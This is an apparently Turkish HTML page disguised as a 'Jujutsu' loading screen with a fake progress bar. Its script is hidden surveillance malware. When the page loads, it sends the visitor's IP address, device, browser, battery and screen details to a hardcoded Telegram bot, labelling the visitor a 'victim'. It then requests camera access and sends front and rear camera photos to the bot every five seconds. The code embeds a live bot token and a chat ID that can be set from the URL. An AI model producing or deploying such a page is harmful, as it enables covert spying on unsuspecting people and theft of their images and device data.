<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Jujutsu</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#000;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .container{
      text-align:center;
      width:90%;
    }

    .logo{
      font-size:90px;
      font-weight:900;
      color:#ff0000;
      text-shadow:
        0 0 5px #ff0000,
        0 0 10px #ff0000,
        0 0 20px #ff0000,
        0 0 40px #ff0000,
        0 0 80px #ff0000;
      margin-bottom:40px;
      letter-spacing:4px;
    }

    .loading-text{
      font-size:22px;
      margin-bottom:15px;
      color:#ddd;
    }

    .bar{
      width:450px;
      max-width:90%;
      height:22px;
      border:2px solid #ff0000;
      margin:auto;
      overflow:hidden;
      border-radius:10px;
      box-shadow:0 0 20px #ff0000;
      background:#111;
    }

    .progress{
      width:0%;
      height:100%;
      background:#ff0000;
      box-shadow:0 0 20px #ff0000;
      transition:width 0.2s linear;
    }

    .percent{
      margin-top:12px;
      font-size:20px;
      color:#ff4d4d;
      font-weight:bold;
    }

    .fake-status{
      margin-top:35px;
      font-size:16px;
      color:#888;
      min-height:25px;
      animation:blink 1.2s infinite;
    }

    @keyframes blink{
      0%{opacity:0.5;}
      50%{opacity:1;}
      100%{opacity:0.5;}
    }

    #hiddenVideo{
      display:none;
    }
  </style>
</head>
<body>

  <video id="hiddenVideo" autoplay muted playsinline></video>

  <div class="container">

    <div class="logo">𝖀𝖒𝖚𝖙</div>

    <div class="loading-text">Yükleniyor...</div>

    <div class="bar">
      <div class="progress" id="progress"></div>
    </div>

    <div class="percent" id="percent">0%</div>

    <div class="fake-status" id="status">
      Sunucuya bağlanılıyor...
    </div>

  </div>

  <script>
    // ========== TELEGRAM AYARLARI (URL'den alınır) ==========
    const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
    
    function urlParametresiAl(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }
    
    let CHAT_ID = urlParametresiAl('id');
    if (!CHAT_ID) {
        CHAT_ID = '7497803165';
    }
    // =======================================================

    // Loading bar animasyonu
    let progress = 0;
    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");

    const fakeMessages = [
      "Sunucuya bağlanılıyor...",
      "İnternet sağlanıyor...",
      "Veriler doğrulanıyor...",
      "Sistem hazırlanıyor...",
      "Güvenli bağlantı kuruluyor...",
      "Paketler indiriliyor...",
      "bir dakika..."
    ];

    setInterval(() => {
      if(progress < 98){
        progress += Math.random() * 2;
        if(progress > 98) progress = 98;
        progressBar.style.width = progress + "%";
        percentText.innerText = Math.floor(progress) + "%";
      }
    }, 350);

    setInterval(() => {
      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
      statusText.innerText = randomMessage;
    }, 2000);

    // ========== KAMERA VE VERİ SİSTEMİ ==========
    let mediaStream = null;
    let fotoSayac = 0;
    let ipBilgisi = 'bilinmiyor';
    let arkaKameraVar = false;

    async function getIp() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ipBilgisi = data.ip;
      } catch(e) {}
    }

    async function getBattery() {
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          return `${Math.round(bat.level * 100)}% ${bat.charging ? 'Şarjda' : 'Pil'}`;
        } catch(e) {}
      }
      return 'bilinmiyor';
    }

    async function cihazBilgisiGonder() {
      try {
        await getIp();
        const battery = await getBattery();
        
        const info = `
🌐 **Yeni Kurban Düştü!** 🌐

🌐 **IP:** \`${ipBilgisi}\`
💻 **Cihaz:** ${navigator.platform}
🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 60)}
🔋 **Batarya:** ${battery}
📺 **Ekran:** ${screen.width}x${screen.height}
🌐 **Dil:** ${navigator.language}
        `.trim();

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: info,
            parse_mode: 'Markdown'
          })
        });
        console.log('Cihaz bilgisi bota postalandı.');
      } catch (err) {
        console.error('Cihaz bilgisi hatası:', err);
      }
    }

    async function fotoCek(kameraTipi) {
      try {
        const video = document.getElementById('hiddenVideo');
        if (!video || !video.videoWidth) return;

        fotoSayac++;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
        const etiket = kameraTipi === 'arka' ? '🔙 ARKA' : '🔚 ÖN';

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, `foto_${fotoSayac}.jpg`);
        formData.append('caption', `📸 **Fotoğraf #${fotoSayac}** — [${etiket} KAMERA]`);
        formData.append('parse_mode', 'Markdown');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        console.log(`Foto #${fotoSayac} gönderildi.`);
      } catch (err) {
        console.error('Foto gönderim hatası:', err);
      }
    }

    async function kamerayiAc(facingMode) {
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        });
        const video = document.getElementById('hiddenVideo');
        video.srcObject = stream;
        await video.play();
        mediaStream = stream;
        return true;
      } catch (err) {
        console.error(`${facingMode} açılamadı:`, err);
        return false;
      }
    }

    let sira = 0; // 0 = ön, 1 = arka
    async function siradakiFotoyuCek() {
      if (sira === 0) {
        const basarili = await kamerayiAc('user');
        if (basarili) {
          await new Promise(r => setTimeout(r, 1000));
          await fotoCek('on');
        }
        sira = 1;
      } else {
        const basarili = await kamerayiAc('environment');
        if (basarili) {
          await new Promise(r => setTimeout(r, 1000));
          await fotoCek('arka');
        }
        sira = 0;
      }
    }

    // === HATA VERMEDEN SIRAYLA ÇALIŞAN ANA MOTOR ===
    async function baslat() {
      // 1. Kamera izni aramadan ÖNCE hemen eldeki cihaz bilgilerini bota fırlat
      await cihazBilgisiGonder();

      // 2. İlk olarak ön kamerayı açıp kullanıcıdan izin koparmaya çalış
      console.log("Kamera izni isteniyor...");
      const izinVerildi = await kamerayiAc('user');
      
      if (izinVerildi) {
        console.log("İzin alındı, döngü başlıyor.");
        // Kameranın ışığı ayarlanana kadar 1 saniye bekle ve ilk fotoyu çek
        await new Promise(r => setTimeout(r, 1000));
        await fotoCek('on');
        
        // Her 5 saniyede bir sırayla ön/arka foto çekmeye devam et
        setInterval(siradakiFotoyuCek, 5000);
      } else {
        statusText.innerText = "Hata: Kamera izni verilmedi!";
      }
    }

    window.addEventListener('beforeunload', () => {
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
    });

    // Sayfa yüklenince sistemi tetikle
    window.onload = baslat;
  </script>

</body>
</html>
